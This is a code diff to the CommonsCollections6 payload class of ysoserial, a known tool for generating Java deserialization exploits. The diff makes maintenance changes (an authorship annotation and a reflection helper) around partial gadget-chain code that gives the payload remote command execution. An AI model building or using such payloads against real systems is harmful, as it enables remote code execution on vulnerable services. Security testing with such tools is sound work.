@@ -6,8 +6,10 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
 
 import java.io.Serializable;
 import java.lang.reflect.Field;
@@ -33,6 +35,7 @@ import java.util.Map;
 */
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
+@Authors({ Authors.MATTHIASKAISER })
 public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {
 
     public Serializable getObject(final String command) throws Exception {
@@ -68,7 +71,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
             f = HashSet.class.getDeclaredField("backingMap");
         }
 
-        f.setAccessible(true);
+        Reflections.setAccessible(f);
         HashMap innimpl = (HashMap) f.get(map);
 
         Field f2 = null;
@@ -78,8 +81,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
             f2 = HashMap.class.getDeclaredField("elementData");
         }
 
-
-        f2.setAccessible(true);
+        Reflections.setAccessible(f2);
         Object[] array = (Object[]) f2.get(innimpl);
 
         Object node = array[0];
@@ -94,7 +96,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
             keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
         }
 
-        keyField.setAccessible(true);
+        Reflections.setAccessible(keyField);
         keyField.set(node, entry);
 
         return map;
